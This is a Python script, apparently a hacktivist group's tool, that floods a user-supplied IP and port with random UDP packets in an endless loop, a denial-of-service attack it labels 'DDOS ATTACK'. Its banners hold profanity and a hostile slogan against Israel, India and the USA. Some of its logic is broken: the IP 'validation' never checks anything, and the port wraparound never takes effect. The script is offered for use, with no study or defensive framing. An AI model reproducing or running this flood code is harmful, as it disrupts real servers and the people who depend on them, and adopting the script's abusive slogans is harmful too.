#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError  # akhane kono error nai

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''


             ░
 ██████╗░░░░██████╗░░░░░███████╗
██╔════╝░░░░██╔══██╗░░░░██╔════╝
██║░░░░░░░░░██║░░██║░░░░█████╗
██║░░░░░░░░░██║░░██║░░░░██╔══╝
╚██████╗░░░░██████╔╝░░░░██║
 ╚═════╝░ ░ ╚═════╝  ░░ ╚═╝
         ░          ░  ░

   <This TooL  Build  By <x!t> </eXploiteR>
       ☣From Cyber Detla Force☣
         <#always_fuck_israel,india,usa>



        ''')
#Type your ip and port number (find IP address using nslookup or any online website)
ip = input(" [💀] Give  A Target IP : ")
port = eval(input(" [💀] Starting Port NO : "))
os.system("clear")
print('''



            ░
 ██████╗░░░░██████╗░░░░░███████╗
██╔════╝░░░░██╔══██╗░░░░██╔════╝
██║░░░░░░░░░██║░░██║░░░░█████╗
██║░░░░░░░░░██║░░██║░░░░██╔══╝
╚██████╗░░░░██████╔╝░░░░██║
 ╚═════╝░ ░ ╚═════╝  ░░ ╚═╝
         ░          ░  ░

 +_______________________________________+
 |                                       |
 |                <HTTP/>                |
 |             FUCKED START              |
 |          WE SCAN WE EXPLOIT           |
 |           Cyber Detla Force           |
 |      Admins :- x!t_eXploiteR          |
 |               osker999                |
 |              Astro Blaze              |
 +_______________________________________+
      

        ''')
try:
        validate = ip
        print(" ✅ Valid IP Checked.... ")
        print(" [💀] Attack Screen Loading ....")
except ValidationError as exception :
        print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    Hey we are CDF Bots. We always ready to Fuck the web Server ")
print(" " )
print(" [💀] CDF attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                print("\n [💀] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
                if port == 65534:
                        port = 1
except KeyboardInterrupt:
        print(" ")
        print("\n [🚫] Ctrl+C Detected.........Exiting")
        print(" [🚫] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [☣] x!t eXploiteR is tired...")